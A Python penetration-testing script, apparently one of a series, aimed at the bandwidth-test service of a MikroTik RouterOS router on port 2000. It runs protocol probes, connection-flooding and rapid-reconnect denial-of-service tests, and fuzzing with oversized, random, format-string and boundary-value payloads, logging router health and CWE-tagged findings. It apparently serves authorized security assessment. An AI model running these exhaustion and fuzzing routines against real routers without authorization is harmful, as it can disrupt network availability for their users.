#!/usr/bin/env python3
"""
MikroTik RouterOS CHR 7.20.8 — Bandwidth-Test Service Attacks
Phase 6, Script 1 of 4
Target: [REDACTED-INTERNAL-IP]:2000 (TCP bandwidth-test, authenticate=no)

Tests (~80):
  1. Protocol analysis (~20): handshake capture, protocol version probing,
     binary protocol structure analysis, auth/no-auth behavior
  2. Resource exhaustion (~30): concurrent connection scaling (10/25/50/100),
     CPU/memory monitoring via REST API after each batch
  3. Protocol fuzzing (~30): random bytes, oversized packets, zero-length,
     partial handshakes, rapid connect/disconnect, crash checks

Evidence: evidence/bandwidth_test_attacks.json
"""

import os
import random
import socket
import struct
import sys
import threading
import time
import warnings

warnings.filterwarnings("ignore")

sys.path.insert(0, '/home/[REDACTED]/Desktop/[REDACTED-PATH]/MikroTik/scripts')
from mikrotik_common import *

ec = EvidenceCollector("attack_bandwidth_test.py", phase=6)

BTEST_PORT = 2000


# =============================================================================
# Helpers
# =============================================================================

def btest_connect(timeout=5):
    """Open a TCP connection to the bandwidth-test service."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((TARGET, BTEST_PORT))
    return s


def btest_send_recv(data, timeout=3, recv_size=4096):
    """Connect, send data, receive response, close."""
    s = btest_connect(timeout=timeout)
    s.send(data)
    time.sleep(0.3)
    try:
        resp = s.recv(recv_size)
    except socket.timeout:
        resp = b""
    s.close()
    return resp


def get_resource_snapshot():
    """Quick CPU/memory snapshot via REST."""
    try:
        status, data = rest_get("/system/resource")
        if status == 200 and isinstance(data, dict):
            return {
                "cpu_load": data.get("cpu-load"),
                "free_memory": data.get("free-memory"),
                "total_memory": data.get("total-memory"),
                "uptime": data.get("uptime"),
            }
    except:
        pass
    return {}


# =============================================================================
# Section 1: Protocol Analysis (~20 tests)
# =============================================================================

def protocol_analysis():
    log("=" * 60)
    log("Section 1: Bandwidth-Test Protocol Analysis")
    log("=" * 60)

    # Test 1: Basic connection and immediate read
    try:
        s = btest_connect(timeout=5)
        time.sleep(0.5)
        try:
            initial = s.recv(4096)
            ec.add_test("proto_analysis", "Connect-and-read",
                        "Connect to btest and read any server-initiated data",
                        f"Received {len(initial)} bytes on connect",
                        {"hex": initial.hex()[:400], "size": len(initial)})
        except socket.timeout:
            ec.add_test("proto_analysis", "Connect-and-read",
                        "Connect to btest and read server-initiated data",
                        "No server-initiated data (client-speaks-first)")
        s.close()
    except Exception as e:
        ec.add_test("proto_analysis", "Connect-and-read",
                    "Connect to bandwidth-test", f"Error: {e}", anomaly=True)

    # Test 2-5: Send known protocol initiation bytes and record responses
    # The MikroTik btest protocol uses a binary header. Protocol version
    # byte is first, followed by direction, flags, etc.
    probes = [
        ("Version-0 probe", b"\x00"),
        ("Version-1 probe (4B)", b"\x01\x00\x00\x00"),
        ("Version-1 send direction", b"\x01\x00\x00\x01"),
        ("Version-1 receive direction", b"\x01\x00\x00\x02"),
        ("Version-1 both directions", b"\x01\x00\x00\x03"),
        ("Version-2 probe", b"\x02\x00\x00\x00"),
        ("Version-255 probe", b"\xff\x00\x00\x00"),
        ("Large version number", b"\x01\x00\xff\xff"),
        ("All-zeros 8B", b"\x00" * 8),
        ("All-ones 8B", b"\xff" * 8),
        ("Null byte only", b"\x00"),
        ("Single 0x01", b"\x01"),
        ("HTTP GET probe", b"GET / HTTP/1.0\r\n\r\n"),
        ("RouterOS API /login", b"\x06/login\x00"),
        ("16-byte handshake", b"\x01\x00\x00\x00" + b"\x00" * 12),
    ]

    for name, probe_data in probes:
        try:
            resp = btest_send_recv(probe_data, timeout=3)
            ec.add_test("proto_analysis", f"Probe: {name}",
                        f"Send {len(probe_data)}-byte probe to btest",
                        f"Response: {len(resp)} bytes",
                        {"probe_hex": probe_data.hex(), "probe_size": len(probe_data),
                         "response_hex": resp.hex()[:400] if resp else "",
                         "response_size": len(resp),
                         "response_text": resp.decode("utf-8", errors="replace")[:200] if resp else ""})
        except Exception as e:
            ec.add_test("proto_analysis", f"Probe: {name}",
                        f"Send probe to btest", f"Error: {e}")

    # Test 6: Protocol structure analysis — send incrementally longer packets
    log("  Testing incremental packet lengths...")
    length_results = []
    for length in [1, 2, 4, 8, 16, 32, 64]:
        try:
            data = b"\x01" + b"\x00" * (length - 1)
            resp = btest_send_recv(data, timeout=2)
            length_results.append({
                "send_length": length,
                "response_length": len(resp),
                "response_hex": resp.hex()[:100] if resp else ""
            })
        except Exception as e:
            length_results.append({"send_length": length, "error": str(e)})

    ec.add_test("proto_analysis", "Incremental packet lengths",
                "Send packets of increasing size to map protocol expectations",
                f"Tested {len(length_results)} lengths",
                {"results": length_results})

    # Test 7: Authentication behavior (service configured authenticate=no)
    try:
        # Try connecting with a fake auth header (username/password fields)
        # btest protocol: version(1) + direction(1) + random_data(2) + user/pass
        auth_probe = b"\x01\x00\x00\x00" + b"\x05admin" + b"\x0bTestPass123"
        resp = btest_send_recv(auth_probe, timeout=3)
        ec.add_test("proto_analysis", "Auth probe with credentials",
                    "Send btest probe with embedded credentials (authenticate=no config)",
                    f"Response: {len(resp)} bytes",
                    {"probe_hex": auth_probe.hex(), "response_hex": resp.hex()[:200] if resp else "",
                     "response_size": len(resp)})
    except Exception as e:
        ec.add_test("proto_analysis", "Auth probe with credentials",
                    "Auth probe to btest", f"Error: {e}")

    # Test 8: Check if btest accepts connections on IPv6 (if available)
    try:
        s6 = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
        s6.settimeout(3)
        s6.connect(("::ffff:" + TARGET, BTEST_PORT))
        ec.add_test("proto_analysis", "IPv6-mapped connection",
                    "Test btest accepts IPv4-mapped IPv6 connections",
                    "Connection accepted on IPv4-mapped IPv6",
                    anomaly=True)
        s6.close()
    except Exception as e:
        ec.add_test("proto_analysis", "IPv6-mapped connection",
                    "Test btest IPv6 connectivity",
                    f"Not available: {e}")


# =============================================================================
# Section 2: Resource Exhaustion (~30 tests)
# =============================================================================

def resource_exhaustion():
    log("=" * 60)
    log("Section 2: Bandwidth-Test Resource Exhaustion")
    log("=" * 60)

    baseline = get_resource_snapshot()
    ec.add_test("resource_exhaustion", "Baseline resource snapshot",
                "Capture CPU/memory before exhaustion tests",
                f"CPU={baseline.get('cpu_load')}%, free_mem={baseline.get('free_memory')}",
                {"snapshot": baseline})

    connection_counts = [10, 25, 50, 100]

    for count in connection_counts:
        log(f"  Opening {count} concurrent connections...")
        sockets = []
        connected = 0
        failed = 0
        start_time = time.time()

        for i in range(count):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((TARGET, BTEST_PORT))
                sockets.append(s)
                connected += 1
            except Exception:
                failed += 1

        elapsed = time.time() - start_time

        ec.add_test("resource_exhaustion", f"Open {count} connections",
                    f"Attempt to open {count} simultaneous TCP connections to btest",
                    f"Connected: {connected}/{count}, failed: {failed}, time: {elapsed:.2f}s",
                    {"requested": count, "connected": connected, "failed": failed,
                     "elapsed_seconds": round(elapsed, 2)},
                    anomaly=failed > count * 0.1)

        # Send data on all connected sockets
        active_after_send = 0
        for s in sockets:
            try:
                s.send(b"\x01\x00\x00\x00")
                active_after_send += 1
            except:
                pass

        ec.add_test("resource_exhaustion", f"Send data on {count} connections",
                    f"Send btest init data on {connected} open connections",
                    f"Active after send: {active_after_send}/{connected}",
                    {"active_after_send": active_after_send, "total_connected": connected})

        # Measure resource impact
        time.sleep(1)
        snapshot = get_resource_snapshot()
        ec.add_test("resource_exhaustion", f"Resource after {count} conns",
                    f"CPU/memory snapshot with {count} connections open",
                    f"CPU={snapshot.get('cpu_load')}%, free_mem={snapshot.get('free_memory')}",
                    {"snapshot": snapshot, "connection_count": count,
                     "baseline_cpu": baseline.get("cpu_load"),
                     "baseline_memory": baseline.get("free_memory")},
                    anomaly=int(snapshot.get("cpu_load") or 0) > 80)

        # Try to open one more connection (check if service still accepting)
        try:
            test_s = btest_connect(timeout=3)
            ec.add_test("resource_exhaustion", f"New conn after {count} open",
                        f"Can new clients connect while {count} are held open?",
                        "New connection accepted (service still responsive)",
                        {"connected": True})
            test_s.close()
        except Exception as e:
            ec.add_test("resource_exhaustion", f"New conn after {count} open",
                        f"Test service availability with {count} connections held",
                        f"New connection FAILED: {e}",
                        {"connected": False, "error": str(e)},
                        anomaly=True)

        # Clean up sockets
        for s in sockets:
            try:
                s.close()
            except:
                pass

        time.sleep(1)

        # Check router health after cleanup
        health = check_router_alive()
        if not health.get("alive"):
            ec.add_test("resource_exhaustion", f"Health after {count} cleanup",
                        f"Router health check after closing {count} connections",
                        "Router NOT responding!",
                        anomaly=True)
            ec.add_finding("HIGH", f"Bandwidth-test DoS at {count} connections",
                           f"Router became unresponsive after {count} concurrent btest connections",
                           cwe="CWE-400")
            wait_for_router()
            break
        else:
            ec.add_test("resource_exhaustion", f"Health after {count} cleanup",
                        f"Router health after closing {count} connections",
                        f"Router healthy, uptime={health.get('uptime')}",
                        {"health": health})

    # Test: Sustained connection hold (hold 50 connections for 30 seconds)
    log("  Sustained connection hold test (50 conns, 30s)...")
    sockets = []
    for i in range(50):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((TARGET, BTEST_PORT))
            s.send(b"\x01\x00\x00\x00")
            sockets.append(s)
        except:
            pass

    survived = 0
    time.sleep(30)
    for s in sockets:
        try:
            s.send(b"\x00")
            survived += 1
        except:
            pass

    ec.add_test("resource_exhaustion", "Sustained 50-conn hold (30s)",
                "Hold 50 btest connections open for 30 seconds and check survival",
                f"{survived}/{len(sockets)} connections survived 30s hold",
                {"initial": len(sockets), "survived": survived, "hold_seconds": 30},
                anomaly=survived < len(sockets) * 0.5)

    for s in sockets:
        try:
            s.close()
        except:
            pass

    # Post-exhaustion recovery snapshot
    time.sleep(2)
    recovery = get_resource_snapshot()
    ec.add_test("resource_exhaustion", "Post-exhaustion recovery",
                "Resource snapshot after all exhaustion tests complete",
                f"CPU={recovery.get('cpu_load')}%, free_mem={recovery.get('free_memory')}",
                {"snapshot": recovery, "baseline": baseline})

    # Test: Rapid open/close cycles
    log("  Rapid open/close cycles (200 iterations)...")
    rapid_success = 0
    rapid_fail = 0
    start = time.time()
    for i in range(200):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((TARGET, BTEST_PORT))
            s.close()
            rapid_success += 1
        except:
            rapid_fail += 1
        if (i + 1) % 50 == 0:
            health = check_router_alive()
            if not health.get("alive"):
                ec.add_finding("HIGH", "Bandwidth-test rapid connect DoS",
                               f"Router unresponsive after {i+1} rapid connect/close cycles",
                               cwe="CWE-400")
                wait_for_router()
                break
    rapid_elapsed = time.time() - start

    ec.add_test("resource_exhaustion", "Rapid open/close (200 cycles)",
                "Rapidly open and close TCP connections to btest",
                f"Success: {rapid_success}, failed: {rapid_fail}, time: {rapid_elapsed:.2f}s",
                {"success": rapid_success, "failed": rapid_fail,
                 "elapsed": round(rapid_elapsed, 2),
                 "rate": round(rapid_success / max(rapid_elapsed, 0.01), 1)},
                anomaly=rapid_fail > 20)

    # Test: Multiple btest data streams simultaneously
    log("  Simultaneous data streams (20 connections sending data)...")
    stream_sockets = []
    for i in range(20):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((TARGET, BTEST_PORT))
            s.send(b"\x01\x00\x00\x01")  # version 1, send direction
            stream_sockets.append(s)
        except:
            pass

    # Send 10KB on each socket
    bytes_sent = 0
    send_errors = 0
    for s in stream_sockets:
        try:
            payload = os.urandom(10240)
            s.sendall(payload)
            bytes_sent += len(payload)
        except:
            send_errors += 1

    ec.add_test("resource_exhaustion", "Simultaneous data streams (20x10KB)",
                "Send 10KB data on 20 simultaneous btest connections",
                f"Sent {bytes_sent} bytes total, {send_errors} send errors",
                {"connections": len(stream_sockets), "bytes_sent": bytes_sent,
                 "send_errors": send_errors})

    for s in stream_sockets:
        try:
            s.close()
        except:
            pass

    check_router_alive()


# =============================================================================
# Section 3: Protocol Fuzzing (~30 tests)
# =============================================================================

def protocol_fuzzing():
    log("=" * 60)
    log("Section 3: Bandwidth-Test Protocol Fuzzing")
    log("=" * 60)

    fuzz_count = 0

    # Pre-fuzz health check
    pre_health = check_router_alive()
    ec.add_test("proto_fuzz", "Pre-fuzz health",
                "Router health before protocol fuzzing",
                f"Alive={pre_health.get('alive')}, uptime={pre_health.get('uptime')}",
                {"health": pre_health})

    # Test 1: Random byte packets of varying sizes
    log("  Fuzzing with random byte packets...")
    random_sizes = [1, 2, 4, 8, 16, 32, 64, 128, 256, 512, 1024]
    for size in random_sizes:
        try:
            payload = os.urandom(size)
            resp = btest_send_recv(payload, timeout=2)
            ec.add_test("proto_fuzz", f"Random bytes ({size}B)",
                        f"Send {size} random bytes to btest",
                        f"Response: {len(resp)} bytes",
                        {"payload_size": size, "response_size": len(resp),
                         "response_hex": resp.hex()[:200] if resp else ""})
        except Exception as e:
            ec.add_test("proto_fuzz", f"Random bytes ({size}B)",
                        f"Send {size} random bytes", f"Error: {e}")
        fuzz_count += 1
        if fuzz_count % 10 == 0:
            h = check_router_alive()
            if not h.get("alive"):
                ec.add_finding("CRITICAL", "Bandwidth-test crash on random input",
                               f"Router crashed after {fuzz_count} fuzz inputs",
                               cwe="CWE-20")
                wait_for_router()

    # Test 2: Oversized packet (1MB)
    log("  Testing oversized packet (1MB)...")
    try:
        s = btest_connect(timeout=10)
        big_payload = os.urandom(1024 * 1024)
        bytes_actually_sent = 0
        try:
            s.sendall(big_payload)
            bytes_actually_sent = len(big_payload)
        except Exception as e:
            bytes_actually_sent = -1
            ec.add_test("proto_fuzz", "Oversized packet (1MB) send error",
                        "Attempt to send 1MB to btest", f"Send error: {e}")
        try:
            resp = s.recv(4096)
        except:
            resp = b""
        ec.add_test("proto_fuzz", "Oversized packet (1MB)",
                    "Send 1MB of random data to bandwidth-test",
                    f"Sent {bytes_actually_sent} bytes, response: {len(resp)} bytes",
                    {"sent": bytes_actually_sent, "response_size": len(resp)})
        s.close()
    except Exception as e:
        ec.add_test("proto_fuzz", "Oversized packet (1MB)",
                    "Send 1MB to btest", f"Error: {e}")

    h = check_router_alive()
    if not h.get("alive"):
        ec.add_finding("CRITICAL", "Bandwidth-test crash on oversized packet",
                       "Router crashed after receiving 1MB packet on btest port",
                       cwe="CWE-120")
        wait_for_router()

    # Test 3: Zero-length send (just connect, send nothing, then close)
    try:
        s = btest_connect(timeout=3)
        time.sleep(1)
        s.close()
        ec.add_test("proto_fuzz", "Zero-length send",
                    "Connect to btest, send nothing, close after 1 second",
                    "Connection closed cleanly (no crash)")
    except Exception as e:
        ec.add_test("proto_fuzz", "Zero-length send",
                    "Zero-length btest probe", f"Error: {e}")

    # Test 4: Partial handshake — send 1 byte then wait
    try:
        s = btest_connect(timeout=5)
        s.send(b"\x01")
        time.sleep(3)
        try:
            resp = s.recv(4096)
        except socket.timeout:
            resp = b""
        ec.add_test("proto_fuzz", "Partial handshake (1 byte)",
                    "Send single byte and wait 3 seconds for server reaction",
                    f"Response: {len(resp)} bytes after 3s wait",
                    {"response_hex": resp.hex()[:200] if resp else ""})
        s.close()
    except Exception as e:
        ec.add_test("proto_fuzz", "Partial handshake (1 byte)",
                    "Partial handshake test", f"Error: {e}")

    # Test 5: TCP RST after connect (abrupt close)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
        s.connect((TARGET, BTEST_PORT))
        s.send(b"\x01\x00\x00\x00")
        s.close()  # Will send RST due to SO_LINGER(0)
        ec.add_test("proto_fuzz", "TCP RST after data",
                    "Send data then force TCP RST (SO_LINGER=0)",
                    "RST sent successfully")
    except Exception as e:
        ec.add_test("proto_fuzz", "TCP RST after data",
                    "RST probe", f"Error: {e}")

    h = check_router_alive()

    # Test 6: Format string payloads
    format_strings = [b"%s%s%s%s%s%s%s%s%s%s", b"%n%n%n%n", b"%x" * 50,
                      b"%d" * 100, b"AAAA%08x.%08x.%08x.%08x"]
    for i, fmt in enumerate(format_strings):
        try:
            resp = btest_send_recv(fmt, timeout=2)
            ec.add_test("proto_fuzz", f"Format string #{i+1}",
                        "Send format string payload to btest",
                        f"Response: {len(resp)} bytes (no crash)",
                        {"payload": fmt.decode("utf-8", errors="replace"),
                         "response_size": len(resp)})
        except Exception as e:
            ec.add_test("proto_fuzz", f"Format string #{i+1}",
                        "Format string probe", f"Error: {e}")

    h = check_router_alive()
    if not h.get("alive"):
        ec.add_finding("CRITICAL", "Bandwidth-test format string crash",
                       "Router crashed on format string input to btest",
                       cwe="CWE-134")
        wait_for_router()

    # Test 7: Null bytes and control characters
    control_payloads = [
        ("All nulls 256B", b"\x00" * 256),
        ("All 0xFF 256B", b"\xff" * 256),
        ("Mixed control chars", bytes(range(256))),
        ("Newlines 1KB", b"\r\n" * 512),
        ("Backspace flood", b"\x08" * 256),
        ("DEL flood", b"\x7f" * 256),
    ]
    for name, payload in control_payloads:
        try:
            resp = btest_send_recv(payload, timeout=2)
            ec.add_test("proto_fuzz", f"Control: {name}",
                        f"Send control character payload ({name}) to btest",
                        f"Response: {len(resp)} bytes",
                        {"payload_size": len(payload), "response_size": len(resp)})
        except Exception as e:
            ec.add_test("proto_fuzz", f"Control: {name}",
                        f"Control char test", f"Error: {e}")
        fuzz_count += 1
        if fuzz_count % 10 == 0:
            h = check_router_alive()
            if not h.get("alive"):
                ec.add_finding("CRITICAL", f"Bandwidth-test crash on {name}",
                               f"Router crashed on control character payload",
                               cwe="CWE-20")
                wait_for_router()

    # Test 8: Integer boundary values in header fields
    boundary_values = [
        ("Max uint16", struct.pack(">HH", 0xFFFF, 0xFFFF)),
        ("Max uint32", struct.pack(">I", 0xFFFFFFFF)),
        ("Negative-1 int32", struct.pack(">i", -1)),
        ("Min int32", struct.pack(">i", -2147483648)),
        ("Zero int32", struct.pack(">I", 0)),
        ("Large length field", struct.pack(">I", 0x7FFFFFFF)),
    ]
    for name, payload in boundary_values:
        try:
            resp = btest_send_recv(payload, timeout=2)
            ec.add_test("proto_fuzz", f"Boundary: {name}",
                        f"Send integer boundary value ({name}) to btest",
                        f"Response: {len(resp)} bytes",
                        {"payload_hex": payload.hex(), "response_size": len(resp)})
        except Exception as e:
            ec.add_test("proto_fuzz", f"Boundary: {name}",
                        f"Boundary value test", f"Error: {e}")

    # Test 9: Rapid connect/disconnect burst (50 in <1 second)
    log("  Rapid connect/disconnect burst (50)...")
    burst_success = 0
    burst_fail = 0
    start = time.time()
    for i in range(50):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
            s.connect((TARGET, BTEST_PORT))
            s.close()
            burst_success += 1
        except:
            burst_fail += 1
    burst_time = time.time() - start

    ec.add_test("proto_fuzz", "Rapid connect/disconnect (50)",
                "50 rapid TCP connect/disconnect cycles to btest",
                f"Success: {burst_success}/50 in {burst_time:.2f}s",
                {"success": burst_success, "failed": burst_fail,
                 "elapsed": round(burst_time, 2)},
                anomaly=burst_fail > 10)

    h = check_router_alive()
    if not h.get("alive"):
        ec.add_finding("HIGH", "Bandwidth-test crash on rapid reconnect",
                       "Router crashed during rapid connect/disconnect burst",
                       cwe="CWE-400")
        wait_for_router()

    # Test 10: Send data in tiny fragments
    log("  Fragment test (1-byte-at-a-time)...")
    try:
        s = btest_connect(timeout=5)
        payload = b"\x01\x00\x00\x00\x00\x00\x00\x00"
        for byte in payload:
            s.send(bytes([byte]))
            time.sleep(0.05)
        time.sleep(0.5)
        try:
            resp = s.recv(4096)
        except socket.timeout:
            resp = b""
        ec.add_test("proto_fuzz", "Byte-at-a-time fragment",
                    "Send btest header one byte at a time with 50ms delays",
                    f"Response: {len(resp)} bytes after fragmented send",
                    {"payload_hex": payload.hex(), "response_size": len(resp)})
        s.close()
    except Exception as e:
        ec.add_test("proto_fuzz", "Byte-at-a-time fragment",
                    "Fragment test", f"Error: {e}")

    # Post-fuzz health check
    post_health = check_router_alive()
    ec.add_test("proto_fuzz", "Post-fuzz health",
                "Router health after all protocol fuzzing",
                f"Alive={post_health.get('alive')}, uptime={post_health.get('uptime')}",
                {"health": post_health,
                 "pre_fuzz_uptime": pre_health.get("uptime")},
                anomaly=not post_health.get("alive"))


# =============================================================================
# Main
# =============================================================================

def main():
    log(f"Starting bandwidth-test attacks against {TARGET}:{BTEST_PORT}")
    log("=" * 60)

    protocol_analysis()
    resource_exhaustion()
    protocol_fuzzing()

    # Pull router logs and save evidence
    ec.save("bandwidth_test_attacks.json")
    ec.summary()


if __name__ == "__main__":
    os.chdir(BASE_DIR)
    main()
